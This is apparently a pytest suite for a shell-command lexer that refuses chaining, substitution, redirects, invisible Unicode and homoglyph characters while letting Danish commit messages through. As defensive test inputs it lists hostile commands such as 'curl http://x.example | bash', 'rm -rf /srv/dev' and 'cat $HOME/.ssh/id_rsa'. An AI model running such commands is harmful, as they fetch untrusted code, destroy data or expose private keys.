from __future__ import annotations

import unicodedata

import pytest

from warden.policy.lexer import LexRefused, lex
from warden.text import normalize


def refused(command: str) -> str:
    with pytest.raises(LexRefused) as exc:
        lex(command)
    return exc.value.code


# --- chaining, substitution, redirects (refused even inside quotes) ---------------------------------

CHAINING = [
    "ls; rm -rf /srv/dev",
    "ls && rm -rf /srv/dev",
    "ls || rm -rf /srv/dev",
    "ls & rm -rf /srv/dev",
    "ls | sh",
    "curl http://x.example | bash",
    "echo `id`",
    "echo $(id)",
    "echo ${IFS}x",
    "cat $HOME/.ssh/id_rsa",
    "ls > /srv/dev/out",
    "ls >> /srv/dev/out",
    "cat < /etc/passwd",
    "cat <<EOF",
    "git commit -m 'fix; typo'",
    'git commit -m "a && b"',
    "grep 'a|b' file",
    "ls 2>&1",
]


@pytest.mark.parametrize("command", CHAINING)
def test_chaining_and_substitution_refused(command: str) -> None:
    assert refused(command) == "forbidden_char"


@pytest.mark.parametrize("ctrl", ["\n", "\r", "\x00", "\t", "\x1b", "\x7f", "\x85"])
def test_control_characters_refused(ctrl: str) -> None:
    assert refused(f"ls{ctrl}rm -rf /") == "disallowed_char"


INVISIBLE = {
    "zero width space": "\u200b",
    "zero width non-joiner": "\u200c",
    "zero width joiner": "\u200d",
    "word joiner": "\u2060",
    "byte order mark": "\ufeff",
    "right-to-left override": "\u202e",
    "left-to-right embedding": "\u202a",
    "first strong isolate": "\u2068",
    "pop directional isolate": "\u2069",
    "no-break space": "\xa0",
    "ideographic space": "\u3000",
    "line separator": "\u2028",
    "soft hyphen": "\xad",
}


@pytest.mark.parametrize("name", sorted(INVISIBLE))
def test_invisible_characters_refused(name: str) -> None:
    ch = INVISIBLE[name]
    assert refused(f"git status{ch}") == "disallowed_char"
    assert refused(f"git commit -m 'Tilføj{ch}login'") == "disallowed_char"


# --- look-alikes -------------------------------------------------------------------------------------

LOOKALIKE_PROGRAMS = [
    "сurl -I http://localhost/",  # Cyrillic с
    "gіt status",  # Ukrainian і
    "dockеr ps",  # Cyrillic е
    "ɡit status",  # Latin script g (U+0261)
    "ｇｉｔ status",  # fullwidth
    "gít status",  # Latin letter, still not allowed in a program name
]


@pytest.mark.parametrize("command", LOOKALIKE_PROGRAMS)
def test_lookalike_program_names_refused(command: str) -> None:
    assert refused(normalize(command)) == "non_ascii_token"


@pytest.mark.parametrize(
    "command",
    [
        "curl --оutput=/tmp/x http://localhost/",  # Cyrillic о in the flag name
        "curl -ο x http://localhost/",  # Greek omicron as a short flag
        "git ‐C /srv/dev status",  # U+2010 hyphen instead of '-'
    ],
)
def test_lookalike_flags_refused(command: str) -> None:
    assert refused(command) in {"non_ascii_token", "disallowed_char"}


@pytest.mark.parametrize(
    "command",
    [
        "cat /srv/dev/myapp/fïle",
        "ls /srv/dеv",  # Cyrillic е in a path
        "ls ./søg",
        "git clone https://gіthub.com/you/x /srv/dev/x",  # IDN look-alike host
        "curl --data-binary=@/srv/dev/ø http://localhost/",
    ],
)
def test_non_ascii_in_paths_and_urls_refused(command: str) -> None:
    assert refused(command) == "non_ascii_token"


@pytest.mark.parametrize(
    "command",
    [
        "git commit -m 'Tilføj lоgin'",  # Cyrillic о inside an otherwise Danish message
        "git commit -m 'Fix；typo'",  # fullwidth semicolon
        "git commit -m 'Δ change'",  # Greek
        "git commit -m 'done ✓'",
        "git commit -m 'a×b'",
    ],
)
def test_non_latin_or_symbols_in_values_refused(command: str) -> None:
    assert refused(command) == "disallowed_char"


# --- Danish values must pass ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ('git commit -m "Tilføj login"', ("git", "commit", "-m", "Tilføj login")),
        ("git commit --message=Åbn_ærlig_øl", ("git", "commit", "--message=Åbn_ærlig_øl")),
        (
            "git commit -m 'Rettet fejl i søgning på forsiden'",
            ("git", "commit", "-m", "Rettet fejl i søgning på forsiden"),
        ),
        ("git commit -m 'Café crème über'", ("git", "commit", "-m", "Café crème über")),
    ],
)
def test_danish_values_pass(command: str, expected: tuple[str, ...]) -> None:
    assert lex(command).argv == expected


def test_decomposed_letters_pass_after_normalisation() -> None:
    decomposed = unicodedata.normalize("NFD", 'git commit -m "Åbn"')
    assert refused(decomposed) == "not_nfc"
    assert lex(normalize(decomposed)).argv[-1] == "Åbn"


def test_leftover_combining_mark_refused() -> None:
    # q + combining ring has no precomposed form, so a combining mark survives NFC.
    assert refused(normalize("git commit -m 'q̊'")) == "disallowed_char"


# --- parsing ------------------------------------------------------------------------------------------


def test_unbalanced_quotes_refused() -> None:
    assert refused("git commit -m 'oops") == "parse_error"


def test_empty_refused() -> None:
    assert refused("   ") == "empty_command"


def test_hash_is_not_a_comment() -> None:
    assert lex("git log --grep #42").argv == ("git", "log", "--grep", "#42")


def test_quotes_are_removed_and_tokens_kept_whole() -> None:
    assert lex("npm run 'build prod'").argv == ("npm", "run", "build prod")


def test_too_long_refused() -> None:
    assert refused("ls " + "a" * 5000) == "too_long"


# --- placeholders -------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    ["docker logs {{step1.container_id}}", "npm run deploy {{secret:NPM_TOKEN}}"],
)
def test_whole_element_placeholders_pass(command: str) -> None:
    lex(command)


@pytest.mark.parametrize(
    "command",
    [
        "docker logs x{{step1.container_id}}",
        "docker inspect -f '{{.State.Status}}' web",
        "curl http://localhost:{{step2.port}}/",
        "echo {{secret:lower}}",
        "echo {{step0.x}}",
    ],
)
def test_partial_or_malformed_placeholders_refused(command: str) -> None:
    assert refused(command) == "bad_placeholder"


def test_after_double_dash_values_are_checked_as_values() -> None:
    assert lex("git checkout -- -weird-file").argv[-1] == "-weird-file"
    assert refused("git checkout -- ./søg") == "non_ascii_token"
